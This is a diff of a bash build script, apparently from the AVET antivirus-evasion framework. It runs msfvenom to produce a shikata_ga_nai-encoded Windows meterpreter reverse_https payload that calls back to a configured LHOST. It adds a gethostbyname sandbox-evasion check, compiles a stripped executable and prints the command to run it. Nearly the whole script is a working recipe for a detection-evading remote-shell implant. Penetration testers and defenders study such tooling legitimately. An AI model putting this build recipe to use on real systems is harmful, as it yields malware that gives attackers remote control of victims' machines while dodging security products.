@@ -1,5 +1,10 @@
 #!/bin/bash        
+
+
+#DESCRIPTION_START
 # Apply shikata and perform gethostbyname sandbox evasion.
+#DESCRIPTION_END
+
 
 # print AVET logo
 cat banner.txt
@@ -15,19 +20,24 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# no command preexec
+set_command_source no_data
+set_command_exec no_command
+# enable debug output
+enable_debug_print
+#CONFIGURATION_END
+
 
 # generate payload and call avet
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc_c.txt
 
 # add gethostbyname sandbox evasion
 add_evasion gethostbyname_sandbox_evasion 'this.that'
-
-# no command preexec
-set_command_source no_data
-set_command_exec no_command
 
 # set shellcode source
 set_payload_source static_from_file input/sc_c.txt
@@ -42,12 +52,16 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode
 
-# enable debug output
-enable_debug_print
 
 # compile
-$win32_compiler -o output/output.exe source/avet.c -lws2_32
-strip output/output.exe
+$win32_compiler -o output/gethostbyname_revhttps_win32.exe source/avet.c -lws2_32
+strip output/gethostbyname_revhttps_win32.exe
 
 # cleanup
 cleanup_techniques
+
+
+echo "
+# Execute the following command:
+# $ gethostbyname_revhttps_win32.exe
+"
